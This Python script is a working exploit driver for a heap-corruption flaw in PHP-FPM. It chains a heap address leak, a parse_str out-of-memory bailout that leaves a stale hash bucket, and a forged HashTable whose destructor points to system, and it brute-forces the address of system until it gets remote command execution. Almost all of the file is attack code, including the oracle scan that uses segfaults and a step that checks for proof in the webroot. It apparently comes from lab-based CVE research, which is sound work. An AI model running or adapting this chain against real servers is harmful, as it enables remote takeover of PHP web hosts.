#!/usr/bin/env python3
"""FPM script-stage forge (CVE-2026-109618).

The mod_php exploit OOMs during STARTUP POST parsing; fpm kills the child
without running shutdown, so that path is unavailable.  This driver
moves the forge into the SCRIPT stage:

    leak   POST /leak2/gassoc.php          (script-stage bailout, works in
           -> L, chunk = L & ~0x1FFFFF      fpm: shutdown runs, 26/26)
    forge  GET  /urlenc/forge.php          (16M via nginx PHP_VALUE)
           parse_str("=<288B pattern>&a=1&Z*n[x]=1", $out)
             'a=1'      -> $out arData (320-class) pops the free-list head
                           = the just-freed raw value buffer -> the PATTERN
                           IS the arData (p0 = 0x20, measured via gdb:
                           ht_dump_fpm.py, tests/fpm_forge_calib.py)
             Z*n[x]=1   -> ex() do_alloca(n) ok, then
                           zend_hash_str_update_ind: idx = nNumUsed++ THEN
                           zend_string_init(n) -> OOM -> bailout
             shutdown   -> zend_array_destroy($out) walks the stale bucket
                           -> trigger zval -> fake HashTable -> pDestructor
                           = system -> RCE

Memory budget (memory_limit=16M): the dance needs 3n <= 16M < 4n
($huge + estrndup copy + do_alloca copy must fit; the key alloc must not),
so n ~ 4.7 MB.

The head-block chunk offset (ARDATA_OFF) is layout-deterministic for a
fresh pool + fixed warmup sequence; verify with --oracle (deliberately
invalid pDestructor -> SIGSEGV proves the trigger), then brute-force k
for the real system address.

Lab only: containers on 127.0.0.1, authorized CVE research fixture.
"""
import argparse
import json
import os
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))
import rce_bruteforce as B  # noqa: E402
import fpm_rce as F  # noqa: E402

ARDATA_OFF = 0x5A2C0             # calibrated for a fresh worker
P0 = 0x40                        # arData - pattern_start (bucket0 evidence)
N_BYTES = 4700000                # 3n <= 16M < 4n

CMD = "id>/var/www/html/u.txt"


def sh(cmd, timeout=60):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def fpm_segv_count():
    dl = sh("docker logs fpm-php 2>&1 | grep -c 'signal 11' || true")
    try:
        return int(dl.stdout.strip().splitlines()[-1])
    except (ValueError, IndexError):
        return 0


def forge_url(port, ardata, system, p0, cmd, n=N_BYTES):
    cmd_hex = cmd.encode().hex()
    return ("/urlenc/forge.php?a=%d&s=%d&p0=%d&c=%s&n=%d"
            % (ardata, system, p0, cmd_hex, n))


def attempt(port, s_cand, cmd, ardata_off=ARDATA_OFF, p0=P0,
            bad_ptr=False):
    """One candidate: leak -> forge -> proof.  Returns (hit, info)."""
    info = {"S": s_cand, "ardata_off": hex(ardata_off), "p0": hex(p0)}

    sh("docker exec %s rm -f /tmp/g.log" % F.FPM_NAME)
    sh("docker exec %s rm -f /var/www/html/u.txt" % F.FPM_NAME)
    B.http(port, "GET", "/index.php", timeout=30)
    st, _ = B.http(port, "POST", "/leak2/gassoc.php?" + B.LEAK_Q,
                   body=B.LEAK_BODY, ctype="text/plain")
    info["leak_resp"] = st
    L = B.read_leak()
    if not L:
        info["error"] = "no leak"
        return False, info
    info["L"] = hex(L)
    chunk = L & B.CHUNK_MASK
    ardata = chunk + ardata_off
    if bad_ptr:
        system_addr = chunk + 0x7FF000   # unmapped in a 1g container
    else:
        system_addr = chunk + s_cand
    info.update(chunk=hex(chunk), arData=hex(ardata),
                system=hex(system_addr))

    st2, data2 = B.http(port, "GET", forge_url(port, ardata, system_addr,
                                               p0, cmd), timeout=120)
    info["resp"] = st2
    info["resp_head"] = data2[:120].decode("utf-8", "replace")
    time.sleep(0.6)

    for _ in range(3):
        st3, data3 = B.http(port, "GET", "/u.txt", timeout=15)
        if st3 == 200 and b"uid=" in data3:
            info["proof"] = data3[:120].decode("utf-8", "replace")
            info["hit"] = True
            return True, info
        time.sleep(0.6)
    info["proof"] = ""
    info["hit"] = False
    return False, info


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=28095)
    ap.add_argument("--children", type=int, default=1)
    ap.add_argument("--profile", default=None)
    ap.add_argument("--oracle", action="store_true",
                    help="fire the forge with an invalid pDestructor; "
                         "SIGSEGV proves the trigger")
    ap.add_argument("--k-lo", type=int, default=0)
    ap.add_argument("--k-hi", type=int, default=32)
    ap.add_argument("--cmd", default=CMD)
    ap.add_argument("--ardata-off", type=lambda x: int(x, 0),
                    default=ARDATA_OFF)
    ap.add_argument("--p0", type=lambda x: int(x, 0), default=P0)
    ap.add_argument("--out", default=os.path.join(
        ROOT, "evidence", "runs", "rce-remote", "rce-fpm-scriptstage.json"))
    args = ap.parse_args()

    B.CMD = args.cmd
    B.CONTAINER = F.FPM_NAME
    off_system, grid_base, grid_slots = B.OFF_SYSTEM, B.S_GRID_BASE, \
        B.S_GRID_SLOTS
    if args.profile:
        with open(args.profile) as fh:
            p = json.load(fh)
        off_system = p["off_system"]
        grid_base = p["grid"]["base"]
        grid_slots = p["grid"]["slots"]
        print("profile: off_system=0x%x grid=0x%x+%d"
              % (off_system, grid_base, grid_slots), flush=True)

    F.start_fpm(args.port, children=args.children)
    print("fpm workers: %s" % F.fpm_worker_count(), flush=True)
    os.makedirs(os.path.dirname(args.out), exist_ok=True)

    attempts = []
    if args.oracle:
        st, body = B.http(args.port, "GET", "/index.php", timeout=30)
        sh("docker exec %s rm -f /tmp/g.log" % F.FPM_NAME)
        B.http(args.port, "POST", "/leak2/gassoc.php?" + B.LEAK_Q,
               body=B.LEAK_BODY, ctype="text/plain")
        L = B.read_leak()
        if not L:
            raise SystemExit("oracle: no leak")
        chunk = L & B.CHUNK_MASK
        print("oracle chunk=0x%x" % chunk, flush=True)
        ok = False
        base_segv = fpm_segv_count()
        # 320-grid scan around the measured offset
        cands = [args.ardata_off + i * 0x140
                 for i in range(-8, 9)]
        for off in cands:
            hit, info = attempt(args.port, 0, args.cmd, ardata_off=off,
                                p0=args.p0, bad_ptr=True)
            segv = fpm_segv_count() - base_segv
            info["segv_new"] = segv
            attempts.append(info)
            print("oracle off=0x%x -> resp=%s segv_new=%d %s"
                  % (off, info["resp"], segv,
                     "TRIGGER" if segv else "no crash"), flush=True)
            if segv:
                ok = True
                break
        result = {"mode": "oracle", "ok": ok, "attempts": attempts,
                  "params": {"ARDATA_OFF": hex(args.ardata_off),
                             "P0": hex(args.p0), "N": N_BYTES}}
        with open(args.out, "w") as fh:
            json.dump(result, fh, indent=2)
        print("oracle: %s" % ("TRIGGER CONFIRMED" if ok else "NO TRIGGER"))
        return

    hit = False
    k = args.k_lo
    while k <= args.k_hi and not hit:
        s_cand = grid_base + off_system + k * 0x10000
        t0 = time.time()
        try:
            hit, info = attempt(args.port, s_cand, args.cmd,
                                ardata_off=args.ardata_off, p0=args.p0)
        except Exception as e:  # noqa: BLE001
            hit, info = False, {"error": "%s: %s" % (type(e).__name__, e)}
        info["k"] = k
        info["secs"] = round(time.time() - t0, 1)
        attempts.append(info)
        print("attempt %2d S=0x%08x -> %s (%.1fs)"
              % (k, s_cand, "HIT" if hit else "miss", info["secs"]),
              flush=True)
        k += 1

    result = {"deploy": "nginx + php-fpm, script-stage forge",
              "attempts": attempts, "hit": hit, "attempts_used": len(attempts),
              "params": {"ARDATA_OFF": hex(args.ardata_off),
                         "P0": hex(args.p0), "N": N_BYTES,
                         "off_system": hex(off_system),
                         "grid_base": hex(grid_base)}}
    with open(args.out, "w") as fh:
        json.dump(result, fh, indent=2)
    print("%s attempts=%d -> %s"
          % ("RCE CONFIRMED" if hit else "NO HIT", len(attempts), args.out))


if __name__ == "__main__":
    main()
